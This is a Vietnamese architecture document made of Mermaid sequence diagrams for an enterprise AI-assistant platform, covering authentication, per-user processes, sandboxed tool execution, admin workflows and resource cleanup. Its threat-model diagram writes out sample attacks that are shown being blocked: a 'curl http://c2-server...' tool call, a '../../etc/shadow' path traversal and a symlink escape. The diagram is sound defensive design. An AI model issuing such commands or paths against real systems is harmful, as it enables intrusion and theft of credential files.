# BỘ SƠ ĐỒ TUẦN TỰ HỆ THỐNG DSH ENTERPRISE (DÙNG CHO DRAW.IO)

> **Hướng dẫn sử dụng Draw.io:**
>
> 1. Truy cập https://app.diagrams.net
> 2. Chọn menu: **Arrange** $\rightarrow$ **Insert** $\rightarrow$ **Advanced** $\rightarrow$ **Mermaid**
> 3. Copy mã nguồn của từng sơ đồ dưới đây dán vào và nhấn **Insert**.

---

## SƠ ĐỒ 0: TỔNG QUÁT TOÀN BỘ VÒNG ĐỜI HỆ THỐNG (END-TO-END OVERVIEW)

```mermaid
sequenceDiagram
    autonumber
    actor User as "Người dùng (Trình duyệt)"
    participant GW as "Main Gateway (:12345)"
    participant Main as "DSH Main Router (:3090)"
    participant Child as "Tiến trình con (127.0.0.1:330x)"
    participant Tool as "Tool Sandbox (dsh-tool-<user>)"
    participant DB as "Volume: dsh-database"

    %% 1. ĐĂNG KÝ / ĐĂNG NHẬP
    Note over User,GW: Giai đoạn 1: Xác thực tài khoản (Đăng ký / Đăng nhập siêu tốc < 100ms)
    opt Người dùng mới chưa có tài khoản
        User->>GW: 1a. Đăng ký tài khoản (POST /api/auth/register)
        GW->>GW: 2a. Lưu tài khoản ở trạng thái "pending" -> Chờ Admin phê duyệt
    end
    User->>GW: 1. Gửi thông tin đăng nhập (POST /api/auth/login)
    GW->>GW: 2. Kiểm tra mật khẩu (bcrypt) & Tạo JWT Token (7 ngày)
    GW-->>User: 3. Cấp Cookie HttpOnly & Trả về { redirectUrl: "/" }

    %% 2. TẢI GIAO DIỆN
    Note over User,Child: Giai đoạn 2: Tải giao diện DSH & Kết nối Realtime
    User->>GW: 4. Truy cập trang chủ (GET / kèm Cookie token)
    GW->>GW: 5. Xác thực JWT & Gắn Header tin cậy (X-DSH-User-Id, Username, Role)
    GW->>Main: 6. Chuyển tiếp Request sang router.js (:3090)
    Main->>Child: 7. Lazy-spawn / Tái sử dụng tiến trình DSH con tại port riêng (127.0.0.1:330x)
    Main->>Child: 8. Reverse-proxy HTTP request vào port nội bộ của User
    Child-->>User: 9. Trả về HTML giao diện DSH (Đã tiêm Enterprise UI theo Role)
    User->>GW: 10. Nâng cấp WebSocket (Upgrade: websocket)
    GW->>Main: 11. Chuyển tiếp WebSocket qua header tin cậy
    Main->>Child: 12. Reverse-proxy WebSocket vào port 127.0.0.1:330x
    Child-->>User: 13. Bắt tay WebSocket thành công (101 Switching Protocols)

    %% 3. LÀM VIỆC & THỰC THI TOOL
    Note over User,DB: Giai đoạn 3: Làm việc & Gọi công cụ theo nhu cầu (On-Demand Tool)
    alt Trường hợp A: Hỏi đáp thông thường (Không dùng Tool)
        User->>Child: 14a. Gửi tin nhắn chat qua WebSocket
        Child->>Child: 15a. Model AI gọi API -> Stream chữ chạy -> Lưu session vào dsh-homes
        Child-->>User: 16a. Hiển thị câu trả lời (0 container Tool sinh ra)
    else Trường hợp B: AI thực thi Công cụ (File System, Python/Bash, Document AI...)
        User->>Child: 14b. Yêu cầu tác vụ (Đọc file docx, xử lý bảng, chạy code Python...)
        Child->>Child: 15b. AI kích hoạt Tool Call -> Plugin chặn local, chuyển thành HTTP POST
        Child->>GW: 16b. POST /internal/exec { userId, username, role, tool, args, workspace }
        GW->>Tool: 17b. Lazy-spawn dsh-tool-<user> (Volume Subpath: <user>, Network: none, CapDrop: ALL)
        GW->>Tool: 18b. docker exec runner.js --b64 <payload> (Tránh deadlock stream Windows)
        Tool->>Tool: 19b. Kiểm tra bảo mật (Path Guard, RBAC)
        Tool->>DB: 20b. Đọc/Ghi file trong thư mục /data/<user>/<workspace>
        Tool->>Tool: 21b. auto-categorize.js tự động phân loại file mới vào files/{docs,sheets,images...}
        Tool-->>GW: 22b. Trả về kết quả JSON chuẩn qua stdout
        GW-->>Child: 23b. Trả kết quả thực thi công cụ cho DSH Main
        Child-->>User: 24b. Model AI tổng hợp dữ liệu và stream câu trả lời hoàn chỉnh
    end

    %% 4. TỰ ĐỘNG THU HỒI TÀI NGUYÊN (DUAL SWEEPER)
    Note over GW,DB: Giai đoạn 4: Thu hồi tài nguyên thông minh (Dual Sweepers)
    GW->>Tool: 25. Tool Sweeper: Xóa container dsh-tool sau 15 phút rảnh rỗi (Thu hồi RAM, Volume dsh-database giữ 100%)
    Main->>Child: 26. DSH Child Sweeper: Tắt tiến trình con sau 30 phút rảnh rỗi (Thu hồi RAM, Volume dsh-homes giữ 100%)
```

---

## SƠ ĐỒ 1A: QUY TRÌNH ĐĂNG KÝ TÀI KHOẢN (USER REGISTRATION)

```mermaid
sequenceDiagram
    autonumber
    actor User as "Người dùng mới"
    participant Browser as "Trình duyệt (login.html)"
    participant Gateway as "Main Gateway (:12345)"
    participant SQLite as "Cơ sở dữ liệu SQLite (users.db)"

    %% 1. ĐIỀN THÔNG TIN ĐĂNG KÝ
    User->>Browser: 1. Truy cập /login -> Chọn tab "Đăng ký tài khoản"
    User->>Browser: 2. Nhập thông tin (Username, Mật khẩu, Xác nhận mật khẩu) -> Bấm "Đăng ký"
    Browser->>Gateway: 3. Gửi yêu cầu: POST /api/auth/register { username, password }

    %% 2. KIỂM TRA ĐỊNH DẠNG (VALIDATION)
    Gateway->>Gateway: 4. Kiểm tra hợp lệ dữ liệu:<br/>- Username: từ 3 đến 32 ký tự, regex: /^[a-zA-Z0-9_-]+$/<br/>- Password: tối thiểu 6 ký tự
    alt Dữ liệu không hợp lệ (Trống, quá ngắn, chứa ký tự đặc biệt)
        Gateway-->>Browser: 5a. Báo lỗi 400 Bad Request ("Username hoặc mật khẩu không hợp lệ.")
        Browser-->>User: 6a. Hiển thị thông báo lỗi trên form
    end

    %% 3. KIỂM TRA TRÙNG LẶP TRONG CƠ SỞ DỮ LIỆU
    Gateway->>SQLite: 7. Kiểm tra trùng lặp: SELECT id FROM users WHERE username = ?
    alt Tên người dùng đã tồn tại
        SQLite-->>Gateway: 8a. Tìm thấy bản ghi trùng tên
        Gateway-->>Browser: 9a. Báo lỗi 409 Conflict ("Tên người dùng đã tồn tại.")
        Browser-->>User: 10a. Hiển thị thông báo yêu cầu đổi tên khác
    else Tên người dùng hợp lệ và khả dụng
        SQLite-->>Gateway: 8b. Không tìm thấy (Username khả dụng)
        Gateway->>Gateway: 9b. Băm mật khẩu bảo mật: bcrypt.hash(password, 10)
        Gateway->>SQLite: 10b. INSERT INTO users (username, password_hash, role='user', status='pending')
        SQLite-->>Gateway: 11b. Xác nhận lưu dữ liệu thành công
        Gateway-->>Browser: 12b. Trả về 201 Created:<br/>{ message: "Đăng ký thành công! Vui lòng chờ Admin phê duyệt." }
        Browser-->>User: 13b. Hiển thị thông báo thành công & Tự động chuyển về tab Đăng nhập
    end
```

---

## SƠ ĐỒ 1B: QUY TRÌNH ĐĂNG NHẬP & PHÁT HÀNH TOKEN (AUTH & JWT)

```mermaid
sequenceDiagram
    autonumber
    actor User as "Người dùng"
    participant Gateway as "Main Gateway (:12345)"
    participant SQLite as "Cơ sở dữ liệu SQLite (users.db)"

    User->>Gateway: 1. POST /api/auth/login { username, password }
    Gateway->>SQLite: 2. Tìm kiếm người dùng theo username (SELECT * FROM users WHERE username = ?)
    SQLite-->>Gateway: 3. Trả về password_hash, role, status
    Gateway->>Gateway: 4. Đối chiếu mật khẩu bằng bcrypt.compare()
    alt Mật khẩu chính xác & Trạng thái ACTIVE
        Gateway->>Gateway: 5. Ký phát JWT Token (Thời hạn 7 ngày, chứa userId, username, role)
        Gateway-->>User: 6. Set-Cookie: dsh_user_token (HttpOnly, SameSite=Lax)<br/>Trả về { ok: true, redirectUrl: "/" }
    else Mật khẩu không đúng
        Gateway-->>User: 7. Báo lỗi 401 Unauthorized ("Tài khoản hoặc mật khẩu không chính xác.")
    else Tài khoản đang chờ duyệt (PENDING)
        Gateway-->>User: 8. Báo lỗi 403 Forbidden ("Tài khoản đang chờ Admin phê duyệt.")
    else Tài khoản bị khóa (INACTIVE)
        Gateway-->>User: 9. Báo lỗi 403 Forbidden ("Tài khoản đã bị vô hiệu hóa.")
    end
```

---

## SƠ ĐỒ 2: TẢI GIAO DIỆN DSH & QUẢN LÝ TIẾN TRÌNH CON (DSH-MAIN ROUTER)

```mermaid
sequenceDiagram
    autonumber
    actor Browser as "Trình duyệt Người dùng"
    participant Gateway as "Main Gateway (:12345)"
    participant Main_Router as "DSH Router (:3090)"
    participant Child_Proc as "Tiến trình DSH con (127.0.0.1:330x)"
    participant Homes_Vol as "Volume: dsh-homes"

    Browser->>Gateway: 1. GET / (Gửi kèm Cookie dsh_user_token)
    Gateway->>Gateway: 2. Giải mã JWT, lọc sạch các header X-DSH-* từ client
    Gateway->>Gateway: 3. Gắn Header định danh tin cậy: X-DSH-User-Id, X-DSH-Username, X-DSH-Role
    Gateway->>Main_Router: 4. Chuyển tiếp Request sang router.js (:3090)
    Main_Router->>Main_Router: 5. Tra cứu tiến trình DSH của User trong memory registry (children Map)
    alt Tiến trình DSH con chưa chạy hoặc đã bị dọn dẹp (Idle)
        Main_Router->>Main_Router: 6a. Cấp phát port nội bộ mới (PORT_BASE + portCursor, vd: 3300, 3301...)
        Main_Router->>Homes_Vol: 6b. ensureHomeProfile: Khởi tạo DSH_HOME tại /data/dsh_homes/user-<id>-<name>
        Main_Router->>Homes_Vol: 6c. cordis.patch.yml: Vô hiệu hóa cứng tool-fs, tool-bash (disabled: true)
        Main_Router->>Child_Proc: 6d. spawn('dsh', ['web', '--port', port], { DSH_HOME, ... })
        Child_Proc->>Homes_Vol: 7. Đọc cấu hình cá nhân, profiles/web và danh mục workspace
        Child_Proc-->>Main_Router: 8. Sẵn sàng nhận kết nối (HTTP 200 ready check)
    else Tiến trình DSH con đang hoạt động
        Main_Router->>Main_Router: 6. Tái sử dụng tiến trình hiện có & Cập nhật lastUse timestamp
    end
    Main_Router->>Child_Proc: 9. Reverse-proxy request vào http://127.0.0.1:<port>
    Child_Proc->>Child_Proc: 10. inject-ui.cjs xử lý giao diện theo Role (Hiện/Ẩn nút Admin Dashboard, Logout)
    Child_Proc-->>Gateway: 11. Trả về mã nguồn HTML giao diện DSH
    Gateway-->>Browser: 12. Hiển thị màn hình làm việc DSH cho người dùng
```

---

## SƠ ĐỒ 3: KẾT NỐI REALTIME WEBSOCKET (WEBSOCKET UPGRADE)

```mermaid
sequenceDiagram
    autonumber
    actor Browser as "Trình duyệt Người dùng"
    participant Gateway as "Gateway Proxy (:12345)"
    participant Main_Router as "DSH Router (:3090)"
    participant Child_Proc as "Tiến trình DSH con (127.0.0.1:330x)"

    Browser->>Gateway: 1. Gửi yêu cầu nâng cấp kết nối (Upgrade: websocket) kèm Cookie token
    Gateway->>Gateway: 2. Kiểm tra tính hợp lệ của Cookie JWT
    Gateway->>Gateway: 3. Gắn Header định danh tin cậy (X-DSH-User-Id, Username, Role)
    Gateway->>Main_Router: 4. Chuyển tiếp yêu cầu Upgrade sang dsh-main (:3090)
    Main_Router->>Main_Router: 5. Tra cứu hoặc khởi động tiến trình con tương ứng của User
    Main_Router->>Child_Proc: 6. proxy.ws chuyển tiếp Socket trực tiếp vào port 127.0.0.1:<child_port>
    Child_Proc-->>Browser: 7. Bắt tay WebSocket thành công (101 Switching Protocols)
    Note over Browser,Child_Proc: Kênh truyền thông tin hai chiều sẵn sàng truyền tải streaming token thời gian thực
```

---

## SƠ ĐỒ 4: HỎI ĐÁP AI THÔNG THƯỜNG (CHAT - KHÔNG GỌI TOOL)

```mermaid
sequenceDiagram
    autonumber
    actor User as "Người dùng"
    participant DSH as "Tiến trình DSH con (127.0.0.1:330x)"
    participant AI_API as "Nhà cung cấp LLM (DeepSeek / OpenAI / Anthropic)"
    participant Homes as "Volume: dsh-homes"

    User->>DSH: 1. Gửi câu hỏi qua kênh WebSocket
    DSH->>Homes: 2. Đọc API Key từ .credentials.yaml và ngữ cảnh chat cũ từ sessions/
    DSH->>AI_API: 3. Gửi Prompt câu hỏi kèm System Prompt và Ngữ cảnh cuộc hội thoại
    loop Truyền dữ liệu dạng luồng (Streaming Chunks)
        AI_API-->>DSH: 4. Trả về từng token văn bản
        DSH-->>User: 5. Stream chữ hiển thị mượt mà trên khung chat
    end
    DSH->>Homes: 6. Ghi nối tin nhắn mới vào file sessions/<session_id>.jsonl
    Note over DSH: Không kích hoạt bất kỳ lệnh gọi Tool nào -> 0 container phụ được tạo ra
```

---

## SƠ ĐỒ 5: CƠ CHẾ THỰC THI CÔNG CỤ TỔNG QUÁT THEO NHU CẦU (ON-DEMAND TOOL EXECUTION)

```mermaid
sequenceDiagram
    autonumber
    actor User as "Người dùng"
    participant DSH as "DSH Shared Brain (Tiến trình con)"
    participant Gateway as "Gateway Exec Router (:3091)"
    participant Tool_Cont as "Sandbox Container (dsh-tool-<user>)"
    participant Database as "Volume: dsh-database (Subpath: <user>)"

    User->>DSH: 1. Yêu cầu tác vụ (Đọc file docx/pdf, viết code Python, tạo bảng tính, chạy lệnh...)
    DSH->>DSH: 2. Model AI quyết định kích hoạt công cụ: Tool Call { tool, args }
    Note over DSH: Patch 10 chặn thực thi local, chuyển thành HTTP POST nội bộ
    DSH->>Gateway: 3. POST /internal/exec { userId, username, role, tool, args, workspace, cwd } (Kèm INTERNAL_TOKEN)
    Gateway->>Gateway: 4. Xác thực INTERNAL_TOKEN & Kiểm tra phân quyền RBAC
    alt Container dsh-tool-<user> chưa tồn tại hoặc đã bị Sweeper thu hồi
        Gateway->>Gateway: 5a. ensureDatabaseSubpath: Tạo thư mục /data/database/<user> (uid 1000, 755)
        Gateway->>Tool_Cont: 5b. Docker create & start dsh-tool-<user>:<br/>- Mount dsh-database với Subpath: <user> -> /data/<user><br/>- Cờ bảo mật: NetworkMode: 'none', CapDrop: ['ALL'], no-new-privileges: true<br/>- Giới hạn: RAM 256MB, CPU 0.5 core, PIDs limit 128
        Gateway->>Tool_Cont: 5c. Chờ container sẵn sàng (waitForToolReady < 15s)
    else Container dsh-tool-<user> đang chạy sẵn
        Gateway->>Tool_Cont: 5. Tái sử dụng container đang hoạt động & Cập nhật lastToolUse
    end
    Gateway->>Tool_Cont: 6. docker exec: node /opt/dsh-tool/runner.js --b64 <payload> (Tránh deadlock stream Windows)
    Tool_Cont->>Tool_Cont: 7. path-guard.js kiểm tra đường dẫn an toàn (Chặn Path Traversal & Symlink Escape)
    Tool_Cont->>Database: 8. Thực thi công cụ (fs.js / doc-reader.js / shell.js) trên thư mục /data/<user>/<workspace>
    Database-->>Tool_Cont: 9. Trả về kết quả đọc/ghi/chạy lệnh
    Tool_Cont->>Tool_Cont: 10. auto-categorize.js quét phân loại file mới vào files/{docs,sheets,images,others}
    Tool_Cont-->>Gateway: 11. Trả về stdout JSON chuẩn hóa qua Docker Exec
    Gateway-->>DSH: 12. Trả kết quả thực thi công cụ về cho DSH Shared Brain
    DSH-->>User: 13. Model AI đọc kết quả, tổng hợp và stream câu trả lời hoàn chỉnh lên màn hình
```

---

## SƠ ĐỒ 6: QUẢN TRỊ ADMIN (PHÊ DUYỆT TÀI KHOẢN & PHÂN QUYỀN AI MODEL)

```mermaid
sequenceDiagram
    autonumber
    actor Admin as "Quản trị viên (Admin)"
    participant DSH_UI as "Giao diện DSH"
    participant Gateway as "Gateway Server (:12345)"
    participant SQLite as "Cơ sở dữ liệu SQLite (users.db)"
    participant Homes as "Volume: dsh-homes"

    Admin->>DSH_UI: 1. Bấm vào Avatar góc phải -> Mở menu -> Bấm "🛡️ Trang Quản trị Admin"
    DSH_UI->>Gateway: 2. Điều hướng sang GET /admin (Kiểm tra Role = 'admin')
    Gateway-->>Admin: 3. Hiển thị Dashboard Quản trị (admin.html)

    %% NHÁNH A: DUYỆT TÀI KHOẢN
    opt Nhánh A: Phê duyệt tài khoản người dùng mới
        Admin->>Gateway: 4a. Bấm "✅ Duyệt" tài khoản (POST /api/admin/approve-user { username })
        Gateway->>SQLite: 5a. Cập nhật status = 'active'
        SQLite-->>Gateway: 6a. Xác nhận cập nhật thành công
        Gateway-->>Admin: 7a. Thông báo tài khoản đã được kích hoạt thành công
    end

    %% NHÁNH B: ĐỒNG BỘ & PHÂN QUYỀN AI MODEL
    opt Nhánh B: Đồng bộ & Phân quyền AI Model tập trung
        Admin->>DSH_UI: 4b. Cấu hình Model & Provider trên giao diện DSH của Admin (Settings -> Models)
        Admin->>Gateway: 5b. Bấm nút "🔄 Làm mới từ DSH" (POST /api/admin/models/sync-from-dsh)
        Gateway->>Homes: 6b. Đọc cấu hình từ user-1-admin (cordis.patch.yml & .credentials.yaml)
        Gateway->>Gateway: 7b. Lưu catalog model vào models_catalog.json
        Gateway-->>Admin: 8b. Hiển thị danh sách Models mới nhất lên bảng quản trị
        Admin->>Gateway: 9b. Tích chọn phân quyền Model cho "Tất cả User" (POST /api/admin/models/scopes)
        Gateway->>Homes: 10b. Tự động đồng bộ API Key tương ứng vào .credentials.yaml của từng User
        Gateway-->>Admin: 11b. Thông báo phân quyền Model & API Key thành công
    end
```

---

## SƠ ĐỒ 7: CƠ CHẾ TỰ ĐỘNG THU HỒI TÀI NGUYÊN (DUAL IDLE SWEEPERS)

```mermaid
sequenceDiagram
    autonumber
    participant Timer as "Tiến trình quét định kỳ (Mỗi 60s)"
    participant GW_Sweeper as "Tool Sweeper (Gateway)"
    participant Main_Sweeper as "Child Sweeper (DSH Main)"
    participant Docker as "Docker Engine"
    participant Tool_Cont as "Container: dsh-tool-<user>"
    participant Child_Proc as "Tiến trình: DSH Child (330x)"
    participant Storage as "Volumes: dsh-database & dsh-homes"

    loop Chạy ngầm định kỳ mỗi 60 giây
        %% 1. DỌN DẸP CONTAINER TOOL SANDBOX
        Timer->>GW_Sweeper: 1. Quét danh sách container dsh-tool đang chạy
        GW_Sweeper->>GW_Sweeper: 2. Tính thời gian rảnh rỗi: (now - lastToolUse)
        alt Container Tool rảnh rỗi >= 15 phút (và không có lệnh nào đang chạy)
            GW_Sweeper->>Docker: 3a. docker stop & docker rm dsh-tool-<user>
            Docker->>Tool_Cont: 4a. Hủy container và thu hồi 256MB RAM cho máy chủ
            Note over Storage: Thư mục /data/<user> trên Volume dsh-database bảo toàn 100%!
        else Đang có lệnh chạy hoặc rảnh rỗi < 15 phút
            GW_Sweeper->>GW_Sweeper: 3b. Giữ nguyên container tiếp tục hoạt động
        end

        %% 2. DỌN DẸP TIẾN TRÌNH CON DSH
        Timer->>Main_Sweeper: 5. Quét danh sách tiến trình DSH con trong memory (children Map)
        Main_Sweeper->>Main_Sweeper: 6. Tính thời gian rảnh rỗi: (now - lastUse)
        alt Tiến trình DSH con rảnh rỗi >= 30 phút
            Main_Sweeper->>Child_Proc: 7a. proc.kill('SIGTERM') đóng tiến trình con
            Main_Sweeper->>Main_Sweeper: 8a. Giải phóng port nội bộ (330x) và thu hồi RAM
            Note over Storage: Lịch sử chat và session trên Volume dsh-homes bảo toàn 100%!
        else Tiến trình đang tương tác hoặc rảnh rỗi < 30 phút
            Main_Sweeper->>Main_Sweeper: 7b. Duy trì tiến trình sẵn sàng nhận request
        end
    end
```

---

## SƠ ĐỒ 8: BẢO MẬT ĐA TẦNG & CHỐNG THOÁT SANDBOX (SANDBOX ESCAPE DEFENSE)

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as "Kẻ tấn công / User nghi vấn"
    participant DSH as "DSH Shared Brain (:3090)"
    participant Gateway as "Gateway Exec Router (:3091)"
    participant Tool as "Tool Container (dsh-tool-<user>)"
    participant Host as "Hệ điều hành Host & Volume dsh-database"

    %% TẦNG 0: BẢO MẬT HẠT NHÂN & MẠNG
    Note over Attacker,Tool: Tầng 0: Cô lập Hạt nhân Linux & Tắt mạng (Kernel Hardening)
    Attacker->>DSH: 1a. Thử chạy mã độc Reverse Shell / Quét cổng / Cài backdoor
    DSH->>Gateway: 2a. POST /internal/exec { tool: "bash", command: "curl http://c2-server..." }
    Gateway->>Tool: 3a. Chuyển lệnh vào sandbox qua Docker Exec
    Tool->>Tool: 4a. Container chạy với USER node (1000), CapDrop: ALL, NetworkMode: 'none'
    Tool-->>Gateway: 5a. Lỗi: "Network is unreachable" & Không có quyền root để can thiệp kernel
    Gateway-->>DSH: 6a. Trả về thông báo lỗi thực thi

    %% TẦNG 1: KIỂM SOÁT PHÂN QUYỀN GỌI TOOL (RBAC)
    Note over Attacker,Gateway: Tầng 1: Kiểm soát phân quyền gọi Tool (Tool RBAC Guard)
    Attacker->>DSH: 1b. Cố tình gọi công cụ quản trị (admin_audit_storage, admin_list_user_workspaces...)
    DSH->>Gateway: 2b. POST /internal/exec { tool: "admin_*", role: "user" }
    Gateway->>Gateway: 3b. Kiểm tra RBAC: Tool 'admin_*' chỉ cho phép role 'admin'
    Gateway-->>DSH: 4b. Từ chối thực thi (403 Forbidden: TOOL_NOT_ALLOWED)
    DSH-->>Attacker: 5b. Báo lỗi không có quyền truy cập công cụ quản trị

    %% TẦNG 2: CHẶN LEO THANG THƯ MỤC (PATH TRAVERSAL)
    Note over Attacker,Tool: Tầng 2: Chặn leo thang thư mục Path Traversal (../)
    Attacker->>DSH: 1c. Gửi đường dẫn vượt cấp (ví dụ: "../../etc/shadow" hoặc "/data/all_users_ro")
    DSH->>Gateway: 2c. POST /internal/exec { tool: "read_file", path: "../../..." }
    Gateway->>Tool: 3c. Chuyển tiếp lệnh vào runner.js
    Tool->>Tool: 4c. path-guard.js giải quyết đường dẫn tuyệt đối (path.resolve)
    Tool->>Tool: 5c. Phát hiện đường dẫn nằm ngoài phạm vi /data/<user>/<workspace>
    Tool-->>Gateway: 6c. Chặn tức thì (Lỗi OUTSIDE_WORKSPACE)
    Gateway-->>DSH: 7c. Trả về kết quả từ chối truy cập

    %% TẦNG 3: CHẶN LIÊN KẾT BIỂU TƯỢNG (SYMLINK ESCAPE)
    Note over Attacker,Host: Tầng 3: Chặn thoát Sandbox bằng Symlink Escape
    Attacker->>DSH: 1d. Tạo Symlink trỏ ra file nhạy cảm ngoài workspace
    DSH->>Gateway: 2d. POST /internal/exec { tool: "read_file", path: "symlink_file" }
    Gateway->>Tool: 3d. Chuyển tiếp lệnh vào container
    Tool->>Host: 4d. Phân giải đường dẫn thực tế đích bằng fs.realpathSync
    Host-->>Tool: 5d. Đích thực tế nằm ngoài thư mục người dùng cho phép
    Tool->>Tool: 6d. Chặn truy cập liên kết biểu tượng (Lỗi OUTSIDE_WORKSPACE)
    Tool-->>Gateway: 7d. Báo lỗi vi phạm an toàn tập tin
    Gateway-->>DSH: 8d. Ngăn chặn tuyệt đối mọi hành vi rò rỉ dữ liệu

    %% TẦNG 4: CÔ LẬP PHẦN CỨNG BẰNG DOCKER VOLUME SUBPATH
    Note over Tool,Host: Tầng 4: Ranh giới phần cứng Docker Volume Subpath
    Note over Tool,Host: dsh-tool-alice CHỈ mount dsh-database/alice vào /data/alice.<br/>Bên trong container của Alice HOÀN TOÀN KHÔNG TỒN TẠI thư mục /admin hay /nva.<br/>Không có bất kỳ lệnh nào có thể đọc dữ liệu người khác!
```

---

## SƠ ĐỒ 9: QUY TRÌNH BÓC TÁCH VÀ XỬ LÝ TÀI LIỆU CHI TIẾT (DOCUMENT AI EXTRACTION)

```mermaid
sequenceDiagram
    autonumber
    actor User as "Người dùng"
    participant DSH as "DSH Shared Brain (:3090)"
    participant Gateway as "Gateway Exec API (:3091)"
    participant Tool as "Tool Container (dsh-tool-<user>)"
    participant Extractor as "Bộ trích xuất doc-extractor.js"
    participant Database as "Volume: dsh-database (Subpath: <user>)"

    User->>DSH: 1. Yêu cầu: "Đọc và tóm tắt file tài liệu trong workspace"
    DSH->>Gateway: 2. POST /internal/exec { tool: "read_document", file_path, workspace }
    Gateway->>Tool: 3. Khởi chạy/Tái sử dụng container & Chuyển lệnh vào runner.js
    Tool->>Extractor: 4. Kích hoạt module bóc tách tài liệu chuyên sâu

    alt Định dạng PDF (.pdf)
        Extractor->>Database: 5a. Đọc nhị phân tập tin PDF từ /data/<user>/<workspace>/...
        Database-->>Extractor: 6a. Trả về Binary data
        Extractor->>Extractor: 7a. Dùng poppler-utils (pdftotext) / pdf-parse bóc tách văn bản & cấu trúc trang
    else Định dạng Word (.docx)
        Extractor->>Database: 5b. Đọc nhị phân tập tin DOCX
        Database-->>Extractor: 6b. Trả về Binary data
        Extractor->>Extractor: 7b. Dùng python3-docx / mammoth chuyển đổi sang Markdown chuẩn hóa
    else Định dạng Bảng tính / Dữ liệu / Mã nguồn (.xlsx, .csv, .txt, .md, .json, .py...)
        Extractor->>Database: 5c. Mở Stream đọc trực tiếp dữ liệu
        Database-->>Extractor: 6c. Trả về nội dung chuỗi ký tự
    end

    Extractor->>Extractor: 8. Chuẩn hóa dữ liệu (Lược bỏ ký tự thừa, cắt gọn kích thước context)
    Extractor-->>Tool: 9. Trả về nội dung văn bản có cấu trúc kèm Metadata (loại file, số trang/dòng)
    Tool-->>Gateway: 10. Đóng gói kết quả JSON stdout gửi về Gateway qua Docker Exec
    Gateway-->>DSH: 11. Chuyển ngữ cảnh tài liệu cho DSH Shared Brain
    DSH->>DSH: 12. Model AI đọc ngữ cảnh tài liệu vừa bóc tách và tạo câu trả lời
    DSH-->>User: 13. Stream kết quả phân tích & tóm tắt chi tiết lên màn hình
```
